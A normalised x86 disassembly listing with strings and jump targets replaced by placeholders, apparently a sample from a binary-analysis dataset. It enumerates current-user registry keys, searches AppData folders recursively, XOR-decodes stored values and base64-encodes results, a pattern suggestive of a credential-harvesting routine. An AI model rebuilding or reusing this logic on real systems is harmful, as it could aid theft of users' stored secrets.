push esi
push eax
call sub_40426c
mov ecx [ ebp + 0x8 ]
add esp 0x30
lea eax [ ebp - 0x618 ]
push eax
lea eax [ ebp - 0x514 ]
push eax
lea eax [ ebp - 0x71c ]
push eax
call sub_403f95
mov ecx [ ebp + 0x8 ]
dec eax
push eax
call sub_403f79
mov ecx eax
call sub_403ce6
sub_404791
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x207 ]
push ebx
push eax
mov [ ebp - 0x208 ] bl
call sub_409951
push esi
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov [ ebp - 0x104 ] bl
call sub_409951
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409ed4
mov esi r--data
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409e53
push [ ebp + 0x10 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409e53
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_409e53
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_40948c
mov edi eax
add esp 0x40
cmp edi ebx
jne r-xdata
mov ebx 0x104
jmp r-xdata
xor al al
jmp r-xdata
push edi
lea eax [ ebp - 0x208 ]
push ebx
push eax
call sub_40426c
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_40a08b
pop ecx
pop ecx
lea ecx [ ebp - 0x208 ]
cmp eax ecx
jne r-xdata
push edi
call sub_409393
pop ecx
mov al 0x1
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409ed4
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409e53
push [ ebp + 0x10 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_409e53
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_409e53
lea eax [ ebp - 0x203 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_409e53
lea eax [ ebp - 0x104 ]
push eax
push [ ebp + 0x8 ]
call sub_4044fd
add esp 0x30
sub_4048d6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_403ece
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_404791
add esp 0xc
test al al
setne al
pop ebp
retn
sub_4048fc
push ebp
mov ebp esp
sub esp 0x65c
push ebx
push esi
push edi
lea ecx [ ebp - 0x454 ]
call sub_403e69
lea eax [ ebp - 0x65c ]
push r--data
push eax
call sub_409ed4
lea eax [ ebp - 0x558 ]
push r--data
push eax
call sub_409ed4
add esp 0x10
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_4077a2
lea eax [ ebp - 0x65c ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x2
xor esi esi
push [ ebp - 0x4 ]
mov ecx eax
call sub_404095
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x454 ]
push eax
push edi
mov ecx esi
call sub_404080
push eax
call sub_4048d6
add esp 0xc
inc edi
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_40407d
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
add [ ebp - 0x4 ] 0x104
dec [ ebp - 0x8 ]
jne r-xdata
mov ecx esi
call sub_403f9c
push esi
call sub_4092d2
pop ecx
push 0x110
call sub_409984
test eax eax
pop ecx
je r-xdata
call sub_405ef9
lea ecx [ ebp - 0x454 ]
xor esi esi
call sub_403f95
test eax eax
jle r-xdata
lea ecx [ ebp - 0x20 ]
call sub_40797c
lea ecx [ ebp - 0x454 ]
call sub_403eb6
pop edi
pop esi
pop ebx
leave
retn
mov ebx 0x208
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e24
test eax eax
jle r-xdata
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
push [ eax + 0x104 ]
lea ecx [ ebp - 0x454 ]
push esi
call sub_403f79
push [ eax + 0x104 ]
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_407870
lea ecx [ ebp - 0x454 ]
inc esi
call sub_403f95
cmp esi eax
jl r-xdata
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
push eax
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_407870
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
add eax 0x104
push eax
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
add eax 0x104
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_407870
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
add eax ebx
push eax
push edi
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
mov ecx eax
call sub_403e01
add eax ebx
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_407870
push esi
lea ecx [ ebp - 0x454 ]
inc edi
call sub_403f79
mov ecx eax
call sub_403e24
cmp edi eax
jl r-xdata
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
push eax
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
push eax
call sub_409f34
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_407870
push esi
lea ecx [ ebp - 0x454 ]
call sub_403f79
xor edi edi
cmp [ eax + 0x104 ] edi
je r-xdata
sub_404bc8
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
xor ebx ebx
mov esi 0x104
push esi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
call sub_409875
push esi
mov [ ebp - 0x8 ] eax
call sub_409875
pop ecx
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x5c ]
call sub_4077a2
mov edi 0x1f4
push edi
call sub_409875
push edi
mov [ ebp - 0x4 ] eax
call sub_409875
mov edi [ SHGetSpecialFolderPathA@IAT ]
pop ecx
pop ecx
push ebx
push 0x1a
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
push ebx
call edi
push r--data
push [ ebp - 0x4 ]
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call sub_405bba
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ ebp - 0xc ] ebx
push [ ebp - 0x3c ]
push [ ebp - 0x38 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x5c ]
call sub_407870
lea eax [ ebp - 0x44 ]
push eax
call sub_405c1c
pop ecx
jmp r-xdata
push [ ebp - 0x14 ]
call sub_40957e
push [ ebp - 0x4 ]
call sub_40957e
pop ecx
pop ecx
push ebx
push 0x1a
push [ ebp - 0x4 ]
push ebx
call edi
push r--data
push [ ebp - 0x4 ]
call [ lstrcatA@IAT ]
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push r--data
push [ ebp - 0x14 ]
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
call sub_405bba
add esp 0x18
test eax eax
je r-xdata
inc [ ebp - 0x18 ]
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_409f34
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call sub_4063c6
add esp 0x10
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x5c ]
call sub_407870
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x5c ]
call sub_407870
lea ecx [ ebp - 0x34 ]
call sub_407e74
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x64
jl r-xdata
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x5c ]
call sub_407870
lea eax [ ebp - 0x34 ]
push eax
call sub_405c1c
pop ecx
mov [ ebp - 0x1c ] ebx
push esi
push ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] esi
call sub_409951
push esi
push ebx
push [ ebp - 0x10 ]
call sub_409951
add esp 0x18
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
call [ RegEnumValueA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push [ ebp - 0x20 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x8 ]
call sub_40957e
push [ ebp - 0x10 ]
call sub_40957e
pop ecx
pop ecx
lea ecx [ ebp - 0x5c ]
call sub_40797c
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_404e00
mov ecx [ esp + 0x4 ]
jmp r-xdata
movsx eax [ ecx ]
test [ eax * 2 + rw-data ] 0x8
jne r-xdata
inc ecx
movsx eax [ ecx ]
inc ecx
cmp eax 0x2d
push esi
mov esi eax
je r-xdata
movsx eax [ ecx ]
inc ecx
cmp eax 0x2b
jne r-xdata
test [ eax * 2 + rw-data ] 0x4
jne r-xdata
xor edx edx
jmp r-xdata
imul edx edx 0xa
lea edx [ edx + eax - 0x30 ]
movsx eax [ ecx ]
inc ecx
cmp esi 0x2d
mov eax edx
pop esi
jne r-xdata
and eax 0xff
retn
neg edx
mov eax edx
sub_404e54
push ebp
mov ebp esp
sub esp 0x200
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
xor ebx ebx
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
push 0x1f3
lea eax [ ebp - 0x1ff ]
push ebx
push eax
mov [ ebp - 0xc ] 0x3
mov [ ebp - 0x200 ] bl
call sub_409951
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp [ ebp - 0x8 ] ebx
pop ebx
je r-xdata
push 0x4a
pop eax
leave
retn
lea eax [ ebp - 0x200 ]
push eax
call sub_404e00
pop ecx
leave
retn
sub_404ed4
push ebp
mov ebp esp
sub esp 0x440
push ebx
push esi
push edi
xor ebx ebx
push 0x1fc
lea eax [ ebp - 0x24b ]
push ebx
push eax
mov [ ebp - 0x24c ] bl
call sub_409951
add esp 0xc
push [ rw-data ]
mov [ ebp - 0x4f ] bx
sub esp 0x10
mov ecx esp
push r--data
mov [ ebp - 0x4d ] bl
call sub_407ccf
lea ecx [ ebp - 0x3c ]
call sub_4077a2
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push ebx
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_40797c
pop edi
pop esi
pop ebx
leave
retn
call sub_404e54
mov esi 0x200
push esi
mov [ ebp - 0x5 ] al
lea eax [ ebp - 0x24c ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
call sub_409951
mov edi [ RegEnumValueA@IAT ]
add esp 0xc
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24c ]
push eax
push ebx
jmp r-xdata
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] esi
call edi
test eax eax
je r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0xc ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
call [ RegCloseKey@IAT ]
push esi
lea eax [ ebp - 0x24c ]
push ebx
push eax
call sub_409951
add esp 0xc
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0x10 ]
cmp [ ebp - 0x4 ] 0x4
jbe r-xdata
push 0x1f3
lea eax [ ebp - 0x43f ]
push ebx
push eax
mov [ ebp - 0x440 ] bl
call sub_409951
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
lea eax [ ebp - 0x24c ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] 0x3
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push 0x4
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
lea eax [ ebp - 0x43c ]
push eax
call sub_409f34
cmp eax 0x1
pop ecx
je r-xdata
mov cl [ ebp - 0x5 ]
xor [ ebp + eax - 0x440 ] cl
inc eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
lea eax [ ebp - 0x24c ]
push eax
call sub_409f34
push eax
lea eax [ ebp - 0x24c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_4063c6
add esp 0x10
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x3c ]
call sub_407870
lea eax [ ebp - 0x43c ]
push eax
call sub_409f34
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x43c ]
push eax
push ecx
call sub_4063c6
add esp 0xc
lea eax [ ebp - 0x49 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_408073
lea ecx [ ebp - 0x49 ]
call sub_407e74
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x3c ]
call sub_407870
lea ecx [ ebp - 0x20 ]
call sub_407e74
sub_405104
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_405bba
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
cmp ebx 0x20
mov eax [ ebp - 0x8 ]
jbe r-xdata
test ebx ebx
jl r-xdata
push 0x20
pop ebx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_405c1c
pop ecx
lea esi [ eax + 0x4 ]
mov edi [ esi ]
add esi 0x4
push esi
push esi
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
dec ebx
lea eax [ edi + esi ]
jns r-xdata
sub_405170
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
push edi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
call sub_405bba
test eax eax
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_405c1c
pop ecx
pop edi
pop esi
pop ebx
leave
retn
xor esi esi
mov [ ebp - 0x1 ] 0x0
cmp esi [ ebp - 0x2c ]
mov [ ebp - 0x1 ] 0x1
jb r-xdata
test bl 0x1
je r-xdata
lea ecx [ ebp - 0x18 ]
and ebx 0xfffffffd
call sub_407e74
test bl 0x2
je r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_409f34
cmp [ ebp - 0x1 ] 0x0
pop ecx
lea esi [ esi + eax + 0x1 ]
jne r-xdata
lea ecx [ ebp - 0x25 ]
and ebx 0xfffffffe
call sub_407e74
push r--data
lea ecx [ ebp - 0x25 ]
or ebx 0x3
call sub_407ccf
push eax
mov eax [ ebp - 0x30 ]
add eax esi
push eax
lea ecx [ ebp - 0x18 ]
call sub_407d38
mov ecx eax
call sub_408111
test al al
je r-xdata
jmp r-xdata
cmp esi [ ebp - 0x2c ]
jb r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_409f34
test eax eax
pop ecx
jbe r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_409f34
pop ecx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x30 ]
lea edi [ eax + esi ]
cmp [ edi ] 0x19
jbe r-xdata
push edi
call sub_409f34
push eax
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_4063c6
add esp 0x10
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
mov ecx [ ebp + 0x8 ]
call sub_407870
lea ecx [ ebp - 0x18 ]
call sub_407e74
sub_40527d
sub esp 0x148
push ebx
push ebp
push esi
push edi
push 0x208
call sub_409875
mov ebx [ lstrcpyA@IAT ]
pop ecx
mov esi eax
mov ebp rw-data
push ebp
push esi
mov [ esp + 0x1c ] esi
call ebx
mov edi [ lstrcatA@IAT ]
push r--data
push esi
call edi
lea eax [ esp + 0x18 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x148
retn
cmp [ esp + 0x44 ] 0x2e
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x14 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push 0x208
call sub_409875
pop ecx
mov esi eax
push ebp
push esi
call ebx
lea eax [ esp + 0x44 ]
push eax
push esi
call edi
push [ rw-data ]
push esi
call edi
push esi
push [ esp + 0x160 ]
call sub_405104
pop ecx
pop ecx
push ebp
push esi
call ebx
lea eax [ esp + 0x44 ]
push eax
push esi
call edi
push [ rw-data ]
push esi
call edi
push esi
push [ esp + 0x160 ]
call sub_405170
push esi
call sub_40957e
mov esi [ esp + 0x20 ]
add esp 0xc
push esi
call sub_40957e
pop ecx
push [ esp + 0x10 ]
call [ FindClose@IAT ]
sub_405364
push esi
xor eax eax
mov esi rw-data
push esi
push eax
push eax
push 0x1a
push eax
call [ SHGetFolderPathA@IAT ]
test eax eax
jne r-xdata
pop esi
retn
push [ esp + 0xc ]
push esi
call [ lstrcatA@IAT ]
push [ esp + 0x8 ]
call sub_40527d
pop ecx
sub_405393
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_407ccf
lea ecx [ ebp - 0x20 ]
call sub_4077a2
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call sub_405364
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call sub_405364
mov esi [ RegOpenKeyA@IAT ]
add esp 0x10
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
mov edi 0x80000001
mov ebx 0x104
push edi
mov [ ebp - 0x8 ] ebx
call esi
test eax eax
jne r-xdata
call sub_406017
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
mov [ ebp - 0x8 ] ebx
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x0
push 0x0
push [ rw-data ]
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
call sub_40797c
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x0
push 0x0
push [ rw-data ]
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40527d
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40527d
pop ecx
sub_40548d
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_409f34
cmp eax 0x4
pop ecx
jae r-xdata
mov cl [ esi ]
push 0x3f
pop edx
xor eax eax
or eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
push edi
push 0x3f
shl eax 0x2
pop edx
xor edi edi
inc eax
dec edx
test edx edx
jg r-xdata
add eax edi
sub edx 0x10
inc edi
test edx edx
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
shl edi 0xc
add eax edi
inc edi
dec edx
cmp edx 0x30
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
shl edi 0x8
add eax edi
sub ecx 0x4
inc edi
test ecx ecx
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
push 0x3f
pop edx
xor edi edi
shl edi 0x10
add eax edi
inc edi
dec edx
cmp edx 0x30
jg r-xdata
cmp dl [ ecx + rw-data ]
je r-xdata
cmp dl [ ecx + rw-data ]
jne r-xdata
mov dl [ esi + 0x2 ]
push 0x3f
pop ecx
xor edi edi
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
mov cl [ esi + 0x3 ]
push 0x3f
pop edx
xor edi edi
pop edi
pop esi
retn
sub_40554b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40548d
mov ebx eax
push esi
mov [ ebp - 0x10 ] ebx
call sub_409f34
pop ecx
cmp ebx eax
mov eax [ ebp + 0xc ]
pop ecx
jbe r-xdata
test ebx ebx
jbe r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov [ ebx + eax ] 0x0
or [ ebp - 0x4 ] 0xffffffff
sub [ ebp - 0x4 ] eax
push edi
lea edi [ ebx + eax - 0x1 ]
mov [ ebp - 0x8 ] 0xfffffffe
sub [ ebp - 0x8 ] eax
push 0x3
xor edx edx
lea eax [ ebx - 0x1 ]
pop ecx
div ecx
add esi 0x5
inc eax
mov [ ebp - 0xc ] eax
pop esi
pop ebx
leave
retn
mov dl al
and dl 0xf
mov [ edi ] dl
mov bl [ esi ]
xor ecx ecx
inc eax
cmp eax 0x40
jb r-xdata
and cl 0xf
shl cl 0x4
add cl dl
mov [ edi ] cl
mov cl [ esi + 0x2 ]
xor edx edx
inc ecx
cmp ecx 0x40
jb r-xdata
cmp cl [ eax + rw-data ]
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx edi
js r-xdata
inc edx
cmp edx 0x40
jb r-xdata
cmp bl [ ecx + rw-data ]
je r-xdata
mov cl [ esi + 0x3 ]
xor eax eax
shr eax 0x4
shl al 0x6
add al dl
mov [ edi - 0x1 ] al
cmp cl [ edx + rw-data ]
je r-xdata
xor edx edx
add esi 0x4
mov cl [ esi ]
inc eax
cmp eax 0x40
jb r-xdata
mov ecx [ ebp - 0x8 ]
add ecx edi
js r-xdata
inc edx
cmp edx 0x40
jb r-xdata
cmp cl [ eax + rw-data ]
je r-xdata
sub edi 0x3
dec [ ebp - 0xc ]
jne r-xdata
shr edx 0x4
shl al 0x2
add dl al
mov [ edi - 0x2 ] dl
cmp cl [ edx + rw-data ]
je r-xdata
mov cl [ esi + 0x1 ]
xor eax eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
pop edi
sub_405657
push ebp
mov ebp esp
sub esp 0x20
or [ ebp - 0x20 ] 0xffffffff
or [ ebp - 0x18 ] 0xffffffff
xor eax eax
inc eax
push 0x5
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] eax
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] eax
push 0x29
xor eax eax
cmp [ ebp + 0x8 ] eax
pop edx
mov [ ebp - 0xc ] 0xfffffffd
mov [ ebp - 0x1c ] 0x3
mov ecx edx
jle r-xdata
mov al dl
leave
retn
push esi
push edi
mov esi [ ebp + esi * 4 - 0x10 ]
lea edx [ edx + esi * 4 ]
and edx 0x8000003f
jns r-xdata
dec esi
or esi 0xfffffffc
inc esi
lea esi [ eax + 0x1 ]
mov edi esi
and edi 0x8000003f
jns r-xdata
dec edx
or edx 0xffffffc0
inc edx
jne r-xdata
dec edi
or edi 0xffffffc0
inc edi
mov eax esi
cmp eax [ ebp + 0x8 ]
jl r-xdata
cdq
and edx 0x3f
add eax edx
sar eax 0x6
and eax 0x80000003
jns r-xdata
mov esi eax
and esi 0x80000003
jns r-xdata
pop edi
pop esi
add ecx [ ebp + eax * 4 - 0x20 ]
mov edx ecx
dec eax
or eax 0xfffffffc
inc eax
sub_4056f2
push ebp
mov ebp esp
sub esp 0x38
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
push r--data
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
sub esp 0x10
mov ecx esp
push eax
call sub_407e01
lea eax [ ebp - 0x1d ]
push eax
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call sub_407e01
lea eax [ ebp - 0x2a ]
push eax
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call sub_407e01
lea eax [ ebp - 0x37 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_407f74
mov ecx eax
call sub_407f74
mov ecx eax
call sub_407f74
mov ecx eax
call sub_407fb6
lea ecx [ ebp - 0x1d ]
call sub_407e74
lea ecx [ ebp - 0x2a ]
call sub_407e74
lea ecx [ ebp - 0x37 ]
call sub_407e74
xor esi esi
cmp edi esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] esi
je r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_407c26
lea ecx [ ebp + 0xc ]
call sub_407e74
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x10 ]
lea ecx [ ebp + 0xc ]
dec edi
call sub_407e92
mov al [ eax ]
mov [ ebp + esi - 0x4 ] al
mov bl [ ebp - 0x3 ]
inc esi
inc [ ebp - 0x10 ]
cmp esi 0x3
jne r-xdata
test edi edi
jne r-xdata
mov al [ ebp - 0x4 ]
shr al 0x2
mov [ ebp - 0xc ] al
mov al [ ebp - 0x4 ]
and al 0x3
shl al 0x4
mov cl bl
shr cl 0x4
add al cl
mov cl [ ebp - 0x2 ]
mov [ ebp - 0xb ] al
mov al bl
and al 0xf
shl al 0x2
shr cl 0x6
add al cl
mov [ ebp - 0xa ] al
mov al [ ebp - 0x2 ]
and al 0x3f
mov [ ebp - 0x9 ] al
xor esi esi
cmp esi edi
je r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_407e92
movzx ecx [ ebp + esi - 0xc ]
inc [ ebp - 0x8 ]
mov cl [ ecx + r--data ]
inc esi
cmp esi 0x4
mov [ eax ] cl
jl r-xdata
xor esi esi
cmp esi 0x3
jge r-xdata
mov al [ ebp - 0x4 ]
mov cl al
shr cl 0x2
mov [ ebp - 0xc ] cl
and al 0x3
mov cl bl
shl al 0x4
shr cl 0x4
add al cl
mov [ ebp - 0xb ] al
mov al [ ebp - 0x2 ]
and bl 0xf
mov cl al
shl bl 0x2
shr cl 0x6
add bl cl
mov [ ebp - 0xa ] bl
and al 0x3f
lea ebx [ esi + 0x1 ]
test ebx ebx
mov [ ebp - 0x9 ] al
jle r-xdata
push 0x3
pop ecx
sub ecx esi
push ecx
lea eax [ ebp + esi - 0x4 ]
push edi
push eax
call sub_409951
mov bl [ ebp - 0x3 ]
add esp 0xc
push 0x3
pop edi
cmp esi edi
jge r-xdata
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_407e92
movzx ecx [ ebp + edi - 0xc ]
inc [ ebp - 0x8 ]
mov cl [ ecx + r--data ]
inc edi
cmp edi ebx
mov [ eax ] cl
jl r-xdata
sub edi esi
push [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_407e92
inc [ ebp - 0x8 ]
dec edi
mov [ eax ] 0x3d
jne r-xdata
sub_4058cc
test [ rw-data ] 0x1
jne r-xdata
movzx eax [ esp + 0x4 ]
push eax
push [ rw-data ]
call sub_409e75
neg eax
pop ecx
sbb eax eax
pop ecx
neg eax
retn
or [ rw-data ] 0x1
push r--data
mov ecx rw-data
call sub_407ccf
push sub_40afc9
call sub_4090f9
pop ecx
sub_405910
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
xor esi esi
and [ ebp - 0xc ] esi
call sub_407e64
test ebx ebx
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_407e74
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
leave
retn
push edi
test esi esi
je r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
call sub_407e92
movzx eax [ eax ]
push eax
call sub_4058cc
